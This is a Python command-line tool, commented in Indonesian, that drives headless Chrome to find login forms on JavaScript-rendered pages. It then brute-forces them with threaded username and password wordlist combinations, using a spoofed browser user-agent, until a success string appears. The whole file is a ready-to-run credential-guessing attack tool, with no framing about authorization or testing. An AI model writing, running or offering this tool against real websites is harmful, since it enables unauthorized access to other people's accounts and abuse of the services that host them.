import argparse
import time
from concurrent.futures import ThreadPoolExecutor
import threading

# Selenium Imports
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# --- Global objects for threading ---
progress_lock = threading.Lock()
stop_event = threading.Event()

def print_banner():
    """Prints the welcome banner."""
    # Banner ASCII art tetap sama
    banner = r"""
██████╗ ██╗   ██╗██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║   ██║██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
██║     ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
╚═╝      ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
        PyBrute Dynamic - Brute Force & Analyzer
    """
    print(banner)


def analyze_dynamic_page(url):
    """Analyzes a dynamic page using Selenium to find forms."""
    print(f"[+] Menganalisis form pada URL dinamis: {url}")
    # Setup Chrome options for headless mode (tidak menampilkan jendela browser)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=3") # Mencegah pesan tidak penting dari webdriver
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")


    driver = None
    try:
        # Menggunakan WebDriver Manager untuk mengelola driver secara otomatis
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
        driver.get(url)

        # Tunggu beberapa detik agar JavaScript sempat me-render halaman
        print("[+] Menunggu halaman dirender oleh JavaScript (5 detik)...")
        time.sleep(5)

        forms = driver.find_elements(By.TAG_NAME, 'form')
        if not forms:
            print("[!] Tidak ditemukan tag <form> setelah halaman dirender.")
            return

        for i, form in enumerate(forms, start=1):
            print(f"\n[+] Ditemukan Form #{i}")
            # Di Selenium, action dan method adalah properti dari elemen
            method = form.get_attribute('method') or 'GET'
            action = form.get_attribute('action') or url
            
            print(f"    Method: {method.upper()}")
            print(f"    Action URL: {action}")
            
            inputs = form.find_elements(By.TAG_NAME, 'input')
            if not inputs:
                print("    Tidak ditemukan input field.")
                continue

            print("    Input Fields:")
            post_data_template = []
            username_field_name, password_field_name = None, None

            for input_field in inputs:
                name = input_field.get_attribute('name')
                input_type = input_field.get_attribute('type') or 'text'
                
                if name:
                    print(f"        - Name: {name}, Type: {input_type}")
                    # Coba tebak mana field username dan password
                    if input_type == 'password':
                        password_field_name = name
                    elif any(kw in name.lower() for kw in ['user', 'log', 'email', 'username']):
                        username_field_name = name
            
            if username_field_name and password_field_name:
                 print(f"\n    [!] Skrip mendeteksi field berikut:")
                 print(f"    Username Field Name: '{username_field_name}'")
                 print(f"    Password Field Name: '{password_field_name}'")
                 print(f"    Gunakan nama-nama ini untuk mode bruteforce.")

    except Exception as e:
        print(f"[-] Terjadi error saat analisis: {e}")
    finally:
        if driver:
            driver.quit()


def brute_force_attempt_dynamic(url, username, password, field_names, success_response, progress_info):
    """Performs a single login attempt on a dynamic page."""
    if stop_event.is_set():
        return None

    # Setiap thread harus memiliki instance driver-nya sendiri
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

    driver = None
    found_credentials = None
    try:
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=chrome_options)
        driver.get(url)
        
        # Tunggu hingga elemen form terlihat (lebih baik dari time.sleep)
        wait = WebDriverWait(driver, 10)
        user_field = wait.until(EC.presence_of_element_located((By.NAME, field_names['user'])))
        pass_field = driver.find_element(By.NAME, field_names['pass'])
        
        user_field.send_keys(username)
        pass_field.send_keys(password)
        
        # Klik tombol submit
        # Coba beberapa cara umum untuk menemukan tombol submit
        try:
            submit_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
            submit_button.click()
        except NoSuchElementException:
            pass_field.submit() # Alternatif: submit dari field password

        # Tunggu beberapa saat untuk melihat hasil login
        time.sleep(3) 

        # Cek apakah teks sukses muncul di halaman atau URL berubah
        if success_response in driver.page_source or success_response in driver.current_url:
            stop_event.set()
            found_credentials = (username, password)

    except (TimeoutException, NoSuchElementException):
        # Gagal menemukan elemen, kemungkinan halaman berbeda atau diblokir
        pass
    except Exception:
        # Error lain
        pass
    finally:
        if driver:
            driver.quit()
        # Update progress
        with progress_lock:
            progress_info['completed'] += 1
            completed = progress_info['completed']
            total = progress_info['total']
            percent = (completed / total) * 100
            print(f"\r[*] Progres: {completed}/{total} ({percent:.2f}%)", end="", flush=True)

    return found_credentials


def brute_force_dynamic(url, user_file, pass_file, user_field, pass_field, success_response):
    """Manages the dynamic brute-force attack."""
    try:
        with open(user_file, "r") as uf: users = [l.strip() for l in uf if l.strip()]
        with open(pass_file, "r") as pf: passwords = [l.strip() for l in pf if l.strip()]
    except FileNotFoundError as e:
        print(f"[-] Error: File tidak ditemukan -> {e.filename}")
        return
        
    combinations = [(u, p) for u in users for p in passwords]
    total_attempts = len(combinations)
    print(f"[+] Total kombinasi: {total_attempts}")
    
    progress_info = {'completed': 0, 'total': total_attempts}
    field_names = {'user': user_field, 'pass': pass_field}
    found_credentials = None

    with ThreadPoolExecutor(max_workers=4) as executor: # Kurangi worker karena Selenium berat
        futures = [executor.submit(brute_force_attempt_dynamic, url, u, p, field_names, success_response, progress_info) for u, p in combinations]
        
        for future in futures:
            result = future.result()
            if result:
                found_credentials = result
                executor.shutdown(wait=False, cancel_futures=True)
                break

    print()
    if found_credentials:
        print("\n" + "="*40)
        print(f"[+] SUKSES! Kredensial ditemukan:")
        print(f"    Username: {found_credentials[0]}")
        print(f"    Password: {found_credentials[1]}")
        print("="*40)
    else:
        print("\n[-] Selesai. Kredensial tidak ditemukan.")


if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Tools Brute Force untuk Halaman Web Dinamis (JS).")
    subparsers = parser.add_subparsers(dest="mode", help="Mode operasi.", required=True)

    # Subparser for analysis
    param_parser = subparsers.add_parser("analyze", help="Mode analisis halaman dinamis.")
    param_parser.add_argument("-u", "--url", required=True, help="URL target untuk dianalisis.")

    # Subparser for brute force
    brute_parser = subparsers.add_parser("bruteforce", help="Mode brute force halaman dinamis.")
    brute_parser.add_argument("-u", "--url", required=True, help="URL halaman login.")
    brute_parser.add_argument("-U", "--userlist", required=True, help="File daftar username.")
    brute_parser.add_argument("-P", "--passlist", required=True, help="File daftar password.")
    brute_parser.add_argument("--user-field", required=True, help="Nilai 'name' dari input field username.")
    brute_parser.add_argument("--pass-field", required=True, help="Nilai 'name' dari input field password.")
    brute_parser.add_argument("--respon", required=True, help="Teks/URL yang menunjukkan login berhasil.")

    args = parser.parse_args()

    start_time = time.time()
    if args.mode == "analyze":
        analyze_dynamic_page(args.url)
    elif args.mode == "bruteforce":
        brute_force_dynamic(args.url, args.userlist, args.passlist, args.user_field, args.pass_field, args.respon)
    
    print(f"\n[i] Waktu eksekusi: {time.time() - start_time:.2f} detik.")
